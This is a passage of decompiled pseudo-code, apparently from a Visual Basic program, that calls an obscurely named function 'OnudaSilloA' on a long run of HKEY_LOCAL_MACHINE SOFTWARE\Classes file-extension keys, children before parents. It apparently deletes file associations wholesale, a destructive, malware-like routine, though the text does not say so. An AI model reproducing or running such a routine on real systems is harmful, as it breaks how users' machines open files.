  loc_0044B042: call var_80A8 = global_004011CC
  loc_0044B058: call var_80AC = global_00401188(var_24, "SOFTWARE\Classes\.wax")
  loc_0044B064: var_80B0 = OnudaSilloA(global_80000002, var_80AC)
  loc_0044B069: call var_80B4 = global_00401054
  loc_0044B072: call var_80B8 = global_004011CC
  loc_0044B088: call var_80BC = global_00401188(var_24, "SOFTWARE\Classes\.wb2\QuattroPro.Notebook.6\ShellNew")
  loc_0044B094: var_80C0 = OnudaSilloA(global_80000002, var_80BC)
  loc_0044B099: call var_80C4 = global_00401054
  loc_0044B0A2: call var_80C8 = global_004011CC
  loc_0044B0B8: call var_80CC = global_00401188(var_24, "SOFTWARE\Classes\.wb2\QuattroPro.Notebook.6")
  loc_0044B0C4: var_80D0 = OnudaSilloA(global_80000002, var_80CC)
  loc_0044B0C9: call var_80D4 = global_00401054
  loc_0044B0D2: call var_80D8 = global_004011CC
  loc_0044B0E8: call var_80DC = global_00401188(var_24, "SOFTWARE\Classes\.wb2\QuattroPro.Graph.6\ShellNew")
  loc_0044B0F4: var_80E0 = OnudaSilloA(global_80000002, var_80DC)
  loc_0044B0F9: call var_80E4 = global_00401054
  loc_0044B102: call var_80E8 = global_004011CC
  loc_0044B118: call var_80EC = global_00401188(var_24, "SOFTWARE\Classes\.wb2\QuattroPro.Graph.6")
  loc_0044B124: var_80F0 = OnudaSilloA(global_80000002, var_80EC)
  loc_0044B129: call var_80F4 = global_00401054
  loc_0044B132: call var_80F8 = global_004011CC
  loc_0044B148: call var_80FC = global_00401188(var_24, "SOFTWARE\Classes\.wb2")
  loc_0044B154: var_8100 = OnudaSilloA(global_80000002, var_80FC)
  loc_0044B159: call var_8104 = global_00401054
  loc_0044B162: call var_8108 = global_004011CC
  loc_0044B178: call var_810C = global_00401188(var_24, "SOFTWARE\Classes\.wct")
  loc_0044B184: var_8110 = OnudaSilloA(global_80000002, var_810C)
  loc_0044B189: call var_8114 = global_00401054
  loc_0044B192: call var_8118 = global_004011CC
  loc_0044B1A8: call var_811C = global_00401188(var_24, "SOFTWARE\Classes\.webpnp")
  loc_0044B1B4: var_8120 = OnudaSilloA(global_80000002, var_811C)
  loc_0044B1B9: call var_8124 = global_00401054
  loc_0044B1C2: call var_8128 = global_004011CC
  loc_0044B1D8: call var_812C = global_00401188(var_24, "SOFTWARE\Classes\.WHT")
  loc_0044B1E4: var_8130 = OnudaSilloA(global_80000002, var_812C)
  loc_0044B1E9: call var_8134 = global_00401054
  loc_0044B1F2: call var_8138 = global_004011CC
  loc_0044B208: call var_813C = global_00401188(var_24, "SOFTWARE\Classes\.wk4\123Worksheet\ShellNew")
  loc_0044B214: var_8140 = OnudaSilloA(global_80000002, var_813C)
  loc_0044B219: call var_8144 = global_00401054
  loc_0044B222: call var_8148 = global_004011CC
  loc_0044B238: call var_814C = global_00401188(var_24, "SOFTWARE\Classes\.wk4\123Worksheet")
  loc_0044B244: var_8150 = OnudaSilloA(global_80000002, var_814C)
  loc_0044B249: call var_8154 = global_00401054
  loc_0044B252: call var_8158 = global_004011CC
  loc_0044B268: call var_815C = global_00401188(var_24, "SOFTWARE\Classes\.wk4")
  loc_0044B274: var_8160 = OnudaSilloA(global_80000002, var_815C)
  loc_0044B279: call var_8164 = global_00401054
  loc_0044B282: call var_8168 = global_004011CC
  loc_0044B298: call var_816C = global_00401188(var_24, "SOFTWARE\Classes\.wll\PersistentHandler")
  loc_0044B2A4: var_8170 = OnudaSilloA(global_80000002, var_816C)
  loc_0044B2A9: call var_8174 = global_00401054
  loc_0044B2B2: call var_8178 = global_004011CC
  loc_0044B2C8: call var_817C = global_00401188(var_24, "SOFTWARE\Classes\.wll")
  loc_0044B2D4: var_8180 = OnudaSilloA(global_80000002, var_817C)
  loc_0044B2D9: call var_8184 = global_00401054
  loc_0044B2E2: call var_8188 = global_004011CC
  loc_0044B2F8: call var_818C = global_00401188(var_24, "SOFTWARE\Classes\.wlt\PersistentHandler")
  loc_0044B304: var_8190 = OnudaSilloA(global_80000002, var_818C)
  loc_0044B309: call var_8194 = global_00401054
  loc_0044B312: call var_8198 = global_004011CC
  loc_0044B328: call var_819C = global_00401188(var_24, "SOFTWARE\Classes\.wlt")
  loc_0044B334: var_81A0 = OnudaSilloA(global_80000002, var_819C)
  loc_0044B339: call var_81A4 = global_00401054
  loc_0044B342: call var_81A8 = global_004011CC
  loc_0044B358: call var_81AC = global_00401188(var_24, "SOFTWARE\Classes\.wm\PersistentHandler")
  loc_0044B364: var_81B0 = OnudaSilloA(global_80000002, var_81AC)
  loc_0044B369: call var_81B4 = global_00401054
  loc_0044B372: call var_81B8 = global_004011CC
  loc_0044B388: call var_81BC = global_00401188(var_24, "SOFTWARE\Classes\.wm\OpenWithProgIds")
  loc_0044B394: var_81C0 = OnudaSilloA(global_80000002, var_81BC)
  loc_0044B399: call var_81C4 = global_00401054
  loc_0044B3A2: call var_81C8 = global_004011CC
  loc_0044B3B8: call var_81CC = global_00401188(var_24, "SOFTWARE\Classes\.wm\OpenWithList\wmplayer.exe")
  loc_0044B3C4: var_81D0 = OnudaSilloA(global_80000002, var_81CC)
  loc_0044B3C9: call var_81D4 = global_00401054
  loc_0044B3D2: call var_81D8 = global_004011CC
  loc_0044B3E8: call var_81DC = global_00401188(var_24, "SOFTWARE\Classes\.wm\OpenWithList")
  loc_0044B3F4: var_81E0 = OnudaSilloA(global_80000002, var_81DC)
  loc_0044B3F9: call var_81E4 = global_00401054
  loc_0044B402: call var_81E8 = global_004011CC
  loc_0044B418: call var_81EC = global_00401188(var_24, "SOFTWARE\Classes\.wm")
  loc_0044B424: var_81F0 = OnudaSilloA(global_80000002, var_81EC)
  loc_0044B429: call var_81F4 = global_00401054
  loc_0044B432: call var_81F8 = global_004011CC
  loc_0044B448: call var_81FC = global_00401188(var_24, "SOFTWARE\Classes\.wma\PersistentHandler")
  loc_0044B454: var_8200 = OnudaSilloA(global_80000002, var_81FC)
  loc_0044B459: call var_8204 = global_00401054
  loc_0044B462: call var_8208 = global_004011CC
  loc_0044B478: call var_820C = global_00401188(var_24, "SOFTWARE\Classes\.wma\OpenWithProgIds")
  loc_0044B484: var_8210 = OnudaSilloA(global_80000002, var_820C)
  loc_0044B489: call var_8214 = global_00401054
  loc_0044B492: call var_8218 = global_004011CC
  loc_0044B4A8: call var_821C = global_00401188(var_24, "SOFTWARE\Classes\.wma\OpenWithList\wmplayer.exe")
  loc_0044B4B4: var_8220 = OnudaSilloA(global_80000002, var_821C)
  loc_0044B4B9: call var_8224 = global_00401054
  loc_0044B4C2: call var_8228 = global_004011CC
  loc_0044B4D8: call var_822C = global_00401188(var_24, "SOFTWARE\Classes\.wma\OpenWithList")
  loc_0044B4E4: var_8230 = OnudaSilloA(global_80000002, var_822C)
  loc_0044B4E9: call var_8234 = global_00401054
  loc_0044B4F2: call var_8238 = global_004011CC
  loc_0044B508: call var_823C = global_00401188(var_24, "SOFTWARE\Classes\.wma")
  loc_0044B514: var_8240 = OnudaSilloA(global_80000002, var_823C)
  loc_0044B519: call var_8244 = global_00401054
  loc_0044B522: call var_8248 = global_004011CC
  loc_0044B538: call var_824C = global_00401188(var_24, "SOFTWARE\Classes\.wmd\OpenWithProgIds")
  loc_0044B544: var_8250 = OnudaSilloA(global_80000002, var_824C)
  loc_0044B549: call var_8254 = global_00401054
  loc_0044B552: call var_8258 = global_004011CC
  loc_0044B568: call var_825C = global_00401188(var_24, "SOFTWARE\Classes\.wmd\OpenWithList\wmplayer.exe")
  loc_0044B574: var_8260 = OnudaSilloA(global_80000002, var_825C)
  loc_0044B579: call var_8264 = global_00401054
  loc_0044B582: call var_8268 = global_004011CC
  loc_0044B598: call var_826C = global_00401188(var_24, "SOFTWARE\Classes\.wmd\OpenWithList")
  loc_0044B5A4: var_8270 = OnudaSilloA(global_80000002, var_826C)
  loc_0044B5A9: call var_8274 = global_00401054
  loc_0044B5B2: call var_8278 = global_004011CC
  loc_0044B5C8: call var_827C = global_00401188(var_24, "SOFTWARE\Classes\.wmd")
  loc_0044B5D4: var_8280 = OnudaSilloA(global_80000002, var_827C)
  loc_0044B5D9: call var_8284 = global_00401054
  loc_0044B5E2: call var_8288 = global_004011CC
  loc_0044B5F8: call var_828C = global_00401188(var_24, "SOFTWARE\Classes\.wmdb")
  loc_0044B604: var_8290 = OnudaSilloA(global_80000002, var_828C)
  loc_0044B609: call var_8294 = global_00401054
  loc_0044B612: call var_8298 = global_004011CC
  loc_0044B628: call var_829C = global_00401188(var_24, "SOFTWARE\Classes\.wmf\PersistentHandler")
  loc_0044B634: var_82A0 = OnudaSilloA(global_80000002, var_829C)
  loc_0044B639: call var_82A4 = global_00401054
  loc_0044B642: call var_82A8 = global_004011CC
  loc_0044B658: call var_82AC = global_00401188(var_24, "SOFTWARE\Classes\.wmf\OpenWithProgids")
  loc_0044B664: var_82B0 = OnudaSilloA(global_80000002, var_82AC)
  loc_0044B669: call var_82B4 = global_00401054
  loc_0044B672: call var_82B8 = global_004011CC
  loc_0044B688: call var_82BC = global_00401188(var_24, "SOFTWARE\Classes\.wmp\PersistentHandler")
  loc_0044B694: var_82C0 = OnudaSilloA(global_80000002, var_82BC)
  loc_0044B699: call var_82C4 = global_00401054
  loc_0044B6A2: call var_82C8 = global_004011CC
  loc_0044B6B8: call var_82CC = global_00401188(var_24, "SOFTWARE\Classes\.wmp")
  loc_0044B6C4: var_82D0 = OnudaSilloA(global_80000002, var_82CC)
  loc_0044B6C9: call var_82D4 = global_00401054
  loc_0044B6D2: call var_82D8 = global_004011CC
  loc_0044B6E8: call var_82DC = global_00401188(var_24, "SOFTWARE\Classes\.wms\OpenWithProgIds")
  loc_0044B6F4: var_82E0 = OnudaSilloA(global_80000002, var_82DC)
  loc_0044B6F9: call var_82E4 = global_00401054
  loc_0044B702: call var_82E8 = global_004011CC
  loc_0044B718: call var_82EC = global_00401188(var_24, "SOFTWARE\Classes\.wms\OpenWithList\wmplayer.exe")
  loc_0044B724: var_82F0 = OnudaSilloA(global_80000002, var_82EC)
  loc_0044B729: call var_82F4 = global_00401054
  loc_0044B732: call var_82F8 = global_004011CC
  loc_0044B748: call var_82FC = global_00401188(var_24, "SOFTWARE\Classes\.wms\OpenWithList")
  loc_0044B754: var_8300 = OnudaSilloA(global_80000002, var_82FC)
  loc_0044B759: call var_8304 = global_00401054
  loc_0044B762: call var_8308 = global_004011CC
  loc_0044B778: call var_830C = global_00401188(var_24, "SOFTWARE\Classes\.wms")
  loc_0044B784: var_8310 = OnudaSilloA(global_80000002, var_830C)
  loc_0044B789: call var_8314 = global_00401054
  loc_0044B792: call var_8318 = global_004011CC
  loc_0044B7A8: call var_831C = global_00401188(var_24, "SOFTWARE\Classes\.wmv\ShellEx\{BB2E617C-0920-11d1-9A0B-00C04FC2D6C1}")
  loc_0044B7B4: var_8320 = OnudaSilloA(global_80000002, var_831C)
  loc_0044B7B9: call var_8324 = global_00401054
  loc_0044B7C2: call var_8328 = global_004011CC
  loc_0044B7D8: call var_832C = global_00401188(var_24, "SOFTWARE\Classes\.wmv\ShellEx")
  loc_0044B7E4: var_8330 = OnudaSilloA(global_80000002, var_832C)
  loc_0044B7E9: call var_8334 = global_00401054
  loc_0044B7F2: call var_8338 = global_004011CC
  loc_0044B808: call var_833C = global_00401188(var_24, "SOFTWARE\Classes\.wmv\PersistentHandler")
  loc_0044B814: var_8340 = OnudaSilloA(global_80000002, var_833C)
  loc_0044B819: call var_8344 = global_00401054
  loc_0044B822: call var_8348 = global_004011CC
  loc_0044B838: call var_834C = global_00401188(var_24, "SOFTWARE\Classes\.wmv\OpenWithProgIds")
  loc_0044B844: var_8350 = OnudaSilloA(global_80000002, var_834C)
  loc_0044B849: call var_8354 = global_00401054
  loc_0044B852: call var_8358 = global_004011CC
  loc_0044B868: call var_835C = global_00401188(var_24, "SOFTWARE\Classes\.wmv\OpenWithList\wmplayer.exe")
  loc_0044B874: var_8360 = OnudaSilloA(global_80000002, var_835C)
  loc_0044B879: call var_8364 = global_00401054
  loc_0044B882: call var_8368 = global_004011CC
  loc_0044B898: call var_836C = global_00401188(var_24, "SOFTWARE\Classes\.wmv\OpenWithList")
  loc_0044B8A4: var_8370 = OnudaSilloA(global_80000002, var_836C)
  loc_0044B8A9: call var_8374 = global_00401054
  loc_0044B8B2: call var_8378 = global_004011CC
  loc_0044B8C8: call var_837C = global_00401188(var_24, "SOFTWARE\Classes\.wmv")
  loc_0044B8D4: var_8380 = OnudaSilloA(global_80000002, var_837C)
  loc_0044B8D9: call var_8384 = global_00401054
  loc_0044B8E2: call var_8388 = global_004011CC
  loc_0044B8F8: call var_838C = global_00401188(var_24, "SOFTWARE\Classes\.wmx\PersistentHandler")
  loc_0044B904: var_8390 = OnudaSilloA(global_80000002, var_838C)
  loc_0044B909: call var_8394 = global_00401054
  loc_0044B912: call var_8398 = global_004011CC
  loc_0044B928: call var_839C = global_00401188(var_24, "SOFTWARE\Classes\.wmx\OpenWithProgIds")
  loc_0044B934: var_83A0 = OnudaSilloA(global_80000002, var_839C)
  loc_0044B939: call var_83A4 = global_00401054
  loc_0044B942: call var_83A8 = global_004011CC
  loc_0044B958: call var_83AC = global_00401188(var_24, "SOFTWARE\Classes\.wmx\OpenWithList\wmplayer.exe")
  loc_0044B964: var_83B0 = OnudaSilloA(global_80000002, var_83AC)
  loc_0044B969: call var_83B4 = global_00401054
  loc_0044B972: call var_83B8 = global_004011CC
  loc_0044B988: call var_83BC = global_00401188(var_24, "SOFTWARE\Classes\.wmx\OpenWithList")
  loc_0044B994: var_83C0 = OnudaSilloA(global_80000002, var_83BC)
  loc_0044B999: call var_83C4 = global_00401054
  loc_0044B9A2: call var_83C8 = global_004011CC
  loc_0044B9B8: call var_83CC = global_00401188(var_24, "SOFTWARE\Classes\.wmx")
  loc_0044B9C4: var_83D0 = OnudaSilloA(global_80000002, var_83CC)
  loc_0044B9C9: call var_83D4 = global_00401054
  loc_0044B9D2: call var_83D8 = global_004011CC
  loc_0044B9E8: call var_83DC = global_00401188(var_24, "SOFTWARE\Classes\.wmz\PersistentHandler")
  loc_0044B9F4: var_83E0 = OnudaSilloA(global_80000002, var_83DC)
  loc_0044B9F9: call var_83E4 = global_00401054
  loc_0044BA02: call var_83E8 = global_004011CC
  loc_0044BA18: call var_83EC = global_00401188(var_24, "SOFTWARE\Classes\.wmz\OpenWithProgIds")
  loc_0044BA24: var_83F0 = OnudaSilloA(global_80000002, var_83EC)
  loc_0044BA29: call var_83F4 = global_00401054
  loc_0044BA32: call var_83F8 = global_004011CC
  loc_0044BA48: call var_83FC = global_00401188(var_24, "SOFTWARE\Classes\.wmz\OpenWithList\wmplayer.exe")
  loc_0044BA54: var_8400 = OnudaSilloA(global_80000002, var_83FC)
  loc_0044BA59: call var_8404 = global_00401054
  loc_0044BA62: call var_8408 = global_004011CC
  loc_0044BA78: call var_840C = global_00401188(var_24, "SOFTWARE\Classes\.wmz\OpenWithList")
  loc_0044BA84: var_8410 = OnudaSilloA(global_80000002, var_840C)
  loc_0044BA89: call var_8414 = global_00401054
  loc_0044BA92: call var_8418 = global_004011CC
  loc_0044BAA8: call var_841C = global_00401188(var_24, "SOFTWARE\Classes\.wmz")
  loc_0044BAB4: var_8420 = OnudaSilloA(global_80000002, var_841C)
  loc_0044BAB9: call var_8424 = global_00401054
  loc_0044BAC2: call var_8428 = global_004011CC
  loc_0044BAD8: call var_842C = global_00401188(var_24, "SOFTWARE\Classes\.wpd\WPWin6.1File\ShellNew")
  loc_0044BAE4: var_8430 = OnudaSilloA(global_80000002, var_842C)
  loc_0044BAE9: call var_8434 = global_00401054
  loc_0044BAF2: call var_8438 = global_004011CC
  loc_0044BB08: call var_843C = global_00401188(var_24, "SOFTWARE\Classes\.wpd\WPWin6.1File")
  loc_0044BB14: var_8440 = OnudaSilloA(global_80000002, var_843C)
  loc_0044BB19: call var_8444 = global_00401054
  loc_0044BB22: call var_8448 = global_004011CC
  loc_0044BB38: call var_844C = global_00401188(var_24, "SOFTWARE\Classes\.wpd")
  loc_0044BB44: var_8450 = OnudaSilloA(global_80000002, var_844C)
  loc_0044BB49: call var_8454 = global_00401054
  loc_0044BB52: call var_8458 = global_004011CC
  loc_0044BB68: call var_845C = global_00401188(var_24, "SOFTWARE\Classes\.wpg\WPDraw30.Drawing\ShellNew")
  loc_0044BB74: var_8460 = OnudaSilloA(global_80000002, var_845C)
  loc_0044BB79: call var_8464 = global_00401054
  loc_0044BB82: call var_8468 = global_004011CC
  loc_0044BB98: call var_846C = global_00401188(var_24, "SOFTWARE\Classes\.wpg\WPDraw30.Drawing")
  loc_0044BBA4: var_8470 = OnudaSilloA(global_80000002, var_846C)
  loc_0044BBA9: call var_8474 = global_00401054
  loc_0044BBB2: call var_8478 = global_004011CC
  loc_0044BBC8: call var_847C = global_00401188(var_24, "SOFTWARE\Classes\.wpg\WPDraw30.Chart\ShellNew")
  loc_0044BBD4: var_8480 = OnudaSilloA(global_80000002, var_847C)
  loc_0044BBD9: call var_8484 = global_00401054
  loc_0044BBE2: call var_8488 = global_004011CC
  loc_0044BBF8: call var_848C = global_00401188(var_24, "SOFTWARE\Classes\.wpg\WPDraw30.Chart")
  loc_0044BC04: var_8490 = OnudaSilloA(global_80000002, var_848C)
  loc_0044BC09: call var_8494 = global_00401054
  loc_0044BC12: call var_8498 = global_004011CC
  loc_0044BC28: call var_849C = global_00401188(var_24, "SOFTWARE\Classes\.wpg\TextArt.Document\ShellNew")
  loc_0044BC34: var_84A0 = OnudaSilloA(global_80000002, var_849C)
  loc_0044BC39: call var_84A4 = global_00401054
  loc_0044BC42: call var_84A8 = global_004011CC
  loc_0044BC58: call var_84AC = global_00401188(var_24, "SOFTWARE\Classes\.wpg\TextArt.Document")
  loc_0044BC64: var_84B0 = OnudaSilloA(global_80000002, var_84AC)
  loc_0044BC69: call var_84B4 = global_00401054
  loc_0044BC72: call var_84B8 = global_004011CC
  loc_0044BC88: call var_84BC = global_00401188(var_24, "SOFTWARE\Classes\.wpg")
  loc_0044BC94: var_84C0 = OnudaSilloA(global_80000002, var_84BC)
  loc_0044BC99: call var_84C4 = global_00401054
  loc_0044BCA2: call var_84C8 = global_004011CC
  loc_0044BCB8: call var_84CC = global_00401188(var_24, "SOFTWARE\Classes\.wpl\OpenWithProgIds")
  loc_0044BCC4: var_84D0 = OnudaSilloA(global_80000002, var_84CC)
  loc_0044BCC9: call var_84D4 = global_00401054
  loc_0044BCD2: call var_84D8 = global_004011CC
  loc_0044BCE8: call var_84DC = global_00401188(var_24, "SOFTWARE\Classes\.wpl\OpenWithList\wmplayer.exe")
  loc_0044BCF4: var_84E0 = OnudaSilloA(global_80000002, var_84DC)
  loc_0044BCF9: call var_84E4 = global_00401054
  loc_0044BD02: call var_84E8 = global_004011CC
  loc_0044BD18: call var_84EC = global_00401188(var_24, "SOFTWARE\Classes\.wpl\OpenWithList")
  loc_0044BD24: var_84F0 = OnudaSilloA(global_80000002, var_84EC)
  loc_0044BD29: call var_84F4 = global_00401054
  loc_0044BD32: call var_84F8 = global_004011CC
  loc_0044BD48: call var_84FC = global_00401188(var_24, "SOFTWARE\Classes\.wpl")
  loc_0044BD54: var_8500 = OnudaSilloA(global_80000002, var_84FC)
  loc_0044BD59: call var_8504 = global_00401054
  loc_0044BD62: call var_8508 = global_004011CC
  loc_0044BD78: call var_850C = global_00401188(var_24, "SOFTWARE\Classes\.wri\OpenWithList\WordPad.exe")
  loc_0044BD84: var_8510 = OnudaSilloA(global_80000002, var_850C)
  loc_0044BD89: call var_8514 = global_00401054
  loc_0044BD92: call var_8518 = global_004011CC
  loc_0044BDA8: call var_851C = global_00401188(var_24, "SOFTWARE\Classes\.wri\OpenWithList")
  loc_0044BDB4: var_8520 = OnudaSilloA(global_80000002, var_851C)
  loc_0044BDB9: call var_8524 = global_00401054
  loc_0044BDC2: call var_8528 = global_004011CC
  loc_0044BDD8: call var_852C = global_00401188(var_24, "SOFTWARE\Classes\.wri")
  loc_0044BDE4: var_8530 = OnudaSilloA(global_80000002, var_852C)
  loc_0044BDE9: call var_8534 = global_00401054
  loc_0044BDF2: call var_8538 = global_004011CC
  loc_0044BE08: call var_853C = global_00401188(var_24, "SOFTWARE\Classes\.wsc")
  loc_0044BE14: var_8540 = OnudaSilloA(global_80000002, var_853C)
  loc_0044BE19: call var_8544 = global_00401054
  loc_0044BE22: call var_8548 = global_004011CC
  loc_0044BE38: call var_854C = global_00401188(var_24, "SOFTWARE\Classes\.WSF")
  loc_0044BE44: var_8550 = OnudaSilloA(global_80000002, var_854C)
  loc_0044BE49: call var_8554 = global_00401054
  loc_0044BE52: call var_8558 = global_004011CC
  loc_0044BE68: call var_855C = global_00401188(var_24, "SOFTWARE\Classes\.WSH")
  loc_0044BE74: var_8560 = OnudaSilloA(global_80000002, var_855C)
  loc_0044BE79: call var_8564 = global_00401054
  loc_0044BE82: call var_8568 = global_004011CC
  loc_0044BE98: call var_856C = global_00401188(var_24, "SOFTWARE\Classes\.wsz\PersistentHandler")
  loc_0044BEA4: var_8570 = OnudaSilloA(global_80000002, var_856C)
  loc_0044BEA9: call var_8574 = global_00401054
  loc_0044BEB2: call var_8578 = global_004011CC
  loc_0044BEC8: call var_857C = global_00401188(var_24, "SOFTWARE\Classes\.wsz")
  loc_0044BED4: var_8580 = OnudaSilloA(global_80000002, var_857C)
  loc_0044BED9: call var_8584 = global_00401054
  loc_0044BEE2: call var_8588 = global_004011CC
  loc_0044BEF8: call var_858C = global_00401188(var_24, "SOFTWARE\Classes\.wtx\PersistentHandler")
  loc_0044BF04: var_8590 = OnudaSilloA(global_80000002, var_858C)
  loc_0044BF09: call var_8594 = global_00401054
  loc_0044BF12: call var_8598 = global_004011CC
  loc_0044BF28: call var_859C = global_00401188(var_24, "SOFTWARE\Classes\.wtx")
  loc_0044BF34: var_85A0 = OnudaSilloA(global_80000002, var_859C)
  loc_0044BF39: call var_85A4 = global_00401054
  loc_0044BF42: call var_85A8 = global_004011CC
  loc_0044BF58: call var_85AC = global_00401188(var_24, "SOFTWARE\Classes\.wvx\PersistentHandler")
  loc_0044BF64: var_85B0 = OnudaSilloA(global_80000002, var_85AC)
  loc_0044BF69: call var_85B4 = global_00401054
  loc_0044BF72: call var_85B8 = global_004011CC
  loc_0044BF88: call var_85BC = global_00401188(var_24, "SOFTWARE\Classes\.wvx\OpenWithProgIds")
  loc_0044BF94: var_85C0 = OnudaSilloA(global_80000002, var_85BC)
  loc_0044BF99: call var_85C4 = global_00401054
  loc_0044BFA2: call var_85C8 = global_004011CC
  loc_0044BFB8: call var_85CC = global_00401188(var_24, "SOFTWARE\Classes\.wvx\OpenWithList\wmplayer.exe")
  loc_0044BFC4: var_85D0 = OnudaSilloA(global_80000002, var_85CC)
  loc_0044BFC9: call var_85D4 = global_00401054
  loc_0044BFD2: call var_85D8 = global_004011CC
  loc_0044BFE8: call var_85DC = global_00401188(var_24, "SOFTWARE\Classes\.wvx\OpenWithList")
  loc_0044BFF4: var_85E0 = OnudaSilloA(global_80000002, var_85DC)
  loc_0044BFF9: call var_85E4 = global_00401054
  loc_0044C002: call var_85E8 = global_004011CC
  loc_0044C018: call var_85EC = global_00401188(var_24, "SOFTWARE\Classes\.wvx")
  loc_0044C024: var_85F0 = OnudaSilloA(global_80000002, var_85EC)
  loc_0044C029: call var_85F4 = global_00401054
  loc_0044C032: call var_85F8 = global_004011CC
  loc_0044C048: call var_85FC = global_00401188(var_24, "SOFTWARE\Classes\.x")
  loc_0044C054: var_8600 = OnudaSilloA(global_80000002, var_85FC)
  loc_0044C059: call var_8604 = global_00401054
  loc_0044C062: call var_8608 = global_004011CC
  loc_0044C078: call var_860C = global_00401188(var_24, "SOFTWARE\Classes\.xbm\PersistentHandler")
  loc_0044C084: var_8610 = OnudaSilloA(global_80000002, var_860C)
  loc_0044C089: call var_8614 = global_00401054
  loc_0044C092: call var_8618 = global_004011CC
  loc_0044C0A8: call var_861C = global_00401188(var_24, "SOFTWARE\Classes\.xbm")
  loc_0044C0B4: var_8620 = OnudaSilloA(global_80000002, var_861C)
  loc_0044C0B9: call var_8624 = global_00401054
  loc_0044C0C2: call var_8628 = global_004011CC
  loc_0044C0D8: call var_862C = global_00401188(var_24, "SOFTWARE\Classes\.xfm")
  loc_0044C0E4: var_8630 = OnudaSilloA(global_80000002, var_862C)
  loc_0044C0E9: call var_8634 = global_00401054
  loc_0044C0F2: call var_8638 = global_004011CC
  loc_0044C108: call var_863C = global_00401188(var_24, "SOFTWARE\Classes\.xht")
  loc_0044C114: var_8640 = OnudaSilloA(global_80000002, var_863C)
  loc_0044C119: call var_8644 = global_00401054
  loc_0044C122: call var_8648 = global_004011CC
  loc_0044C138: call var_864C = global_00401188(var_24, "SOFTWARE\Classes\.xhtml")
  loc_0044C144: var_8650 = OnudaSilloA(global_80000002, var_864C)
  loc_0044C149: call var_8654 = global_00401054
  loc_0044C152: call var_8658 = global_004011CC
  loc_0044C168: call var_865C = global_00401188(var_24, "SOFTWARE\Classes\.xix\PersistentHandler")
  loc_0044C174: var_8660 = OnudaSilloA(global_80000002, var_865C)
  loc_0044C179: call var_8664 = global_00401054
  loc_0044C182: call var_8668 = global_004011CC
  loc_0044C198: call var_866C = global_00401188(var_24, "SOFTWARE\Classes\.xix")
  loc_0044C1A4: var_8670 = OnudaSilloA(global_80000002, var_866C)
  loc_0044C1A9: call var_8674 = global_00401054
  loc_0044C1B2: call var_8678 = global_004011CC
  loc_0044C1C8: call var_867C = global_00401188(var_24, "SOFTWARE\Classes\.xlb\PersistentHandler")
  loc_0044C1D4: var_8680 = OnudaSilloA(global_80000002, var_867C)
  loc_0044C1D9: call var_8684 = global_00401054
  loc_0044C1E2: call var_8688 = global_004011CC
  loc_0044C1F8: call var_868C = global_00401188(var_24, "SOFTWARE\Classes\.xlb")
  loc_0044C204: var_8690 = OnudaSilloA(global_80000002, var_868C)
  loc_0044C209: call var_8694 = global_00401054
  loc_0044C212: call var_8698 = global_004011CC
  loc_0044C228: call var_869C = global_00401188(var_24, "SOFTWARE\Classes\.xlc\PersistentHandler")
  loc_0044C234: var_86A0 = OnudaSilloA(global_80000002, var_869C)
  loc_0044C239: call var_86A4 = global_00401054
  loc_0044C242: call var_86A8 = global_004011CC
  loc_0044C258: call var_86AC = global_00401188(var_24, "SOFTWARE\Classes\.xlc")
  loc_0044C264: var_86B0 = OnudaSilloA(global_80000002, var_86AC)
  loc_0044C269: call var_86B4 = global_00401054
  loc_0044C272: call var_86B8 = global_004011CC
  loc_0044C288: call var_86BC = global_00401188(var_24, "SOFTWARE\Classes\.xls\PersistentHandler")
  loc_0044C294: var_86C0 = OnudaSilloA(global_80000002, var_86BC)
  loc_0044C299: call var_86C4 = global_00401054
  loc_0044C2A2: call var_86C8 = global_004011CC
  loc_0044C2B8: call var_86CC = global_00401188(var_24, "SOFTWARE\Classes\.xls\ExcelWorksheet\ShellNew")
  loc_0044C2C4: var_86D0 = OnudaSilloA(global_80000002, var_86CC)
  loc_0044C2C9: call var_86D4 = global_00401054
  loc_0044C2D2: call var_86D8 = global_004011CC
  loc_0044C2E8: call var_86DC = global_00401188(var_24, "SOFTWARE\Classes\.xls\ExcelWorksheet")
  loc_0044C2F4: var_86E0 = OnudaSilloA(global_80000002, var_86DC)
  loc_0044C2F9: call var_86E4 = global_00401054
  loc_0044C302: call var_86E8 = global_004011CC
  loc_0044C318: call var_86EC = global_00401188(var_24, "SOFTWARE\Classes\.xls\Excel.Sheet.5\ShellNew")
  loc_0044C324: var_86F0 = OnudaSilloA(global_80000002, var_86EC)
  loc_0044C329: call var_86F4 = global_00401054
  loc_0044C332: call var_86F8 = global_004011CC
  loc_0044C348: call var_86FC = global_00401188(var_24, "SOFTWARE\Classes\.xls\Excel.Sheet.5")
  loc_0044C354: var_8700 = OnudaSilloA(global_80000002, var_86FC)
  loc_0044C359: call var_8704 = global_00401054
  loc_0044C362: call var_8708 = global_004011CC
  loc_0044C378: call var_870C = global_00401188(var_24, "SOFTWARE\Classes\.xls")
  loc_0044C384: var_8710 = OnudaSilloA(global_80000002, var_870C)
  loc_0044C389: call var_8714 = global_00401054
  loc_0044C392: call var_8718 = global_004011CC
  loc_0044C3A8: call var_871C = global_00401188(var_24, "SOFTWARE\Classes\.xlt\PersistentHandler")
  loc_0044C3B4: var_8720 = OnudaSilloA(global_80000002, var_871C)
  loc_0044C3B9: call var_8724 = global_00401054
  loc_0044C3C2: call var_8728 = global_004011CC
  loc_0044C3D8: call var_872C = global_00401188(var_24, "SOFTWARE\Classes\.xlt")
  loc_0044C3E4: var_8730 = OnudaSilloA(global_80000002, var_872C)
  loc_0044C3E9: call var_8734 = global_00401054
  loc_0044C3F2: call var_8738 = global_004011CC
  loc_0044C408: call var_873C = global_00401188(var_24, "SOFTWARE\Classes\.xml\PersistentHandler")
  loc_0044C414: var_8740 = OnudaSilloA(global_80000002, var_873C)
  loc_0044C419: call var_8744 = global_00401054
  loc_0044C422: call var_8748 = global_004011CC
  loc_0044C438: call var_874C = global_00401188(var_24, "SOFTWARE\Classes\.xml")
  loc_0044C444: var_8750 = OnudaSilloA(global_80000002, var_874C)
  loc_0044C449: call var_8754 = global_00401054
  loc_0044C452: call var_8758 = global_004011CC
  loc_0044C468: call var_875C = global_00401188(var_24, "SOFTWARE\Classes\.xsl\PersistentHandler")
  loc_0044C474: var_8760 = OnudaSilloA(global_80000002, var_875C)
  loc_0044C479: call var_8764 = global_00401054
  loc_0044C482: call var_8768 = global_004011CC
  loc_0044C498: call var_876C = global_00401188(var_24, "SOFTWARE\Classes\.xsl")
  loc_0044C4A4: var_8770 = OnudaSilloA(global_80000002, var_876C)
  loc_0044C4A9: call var_8774 = global_00401054
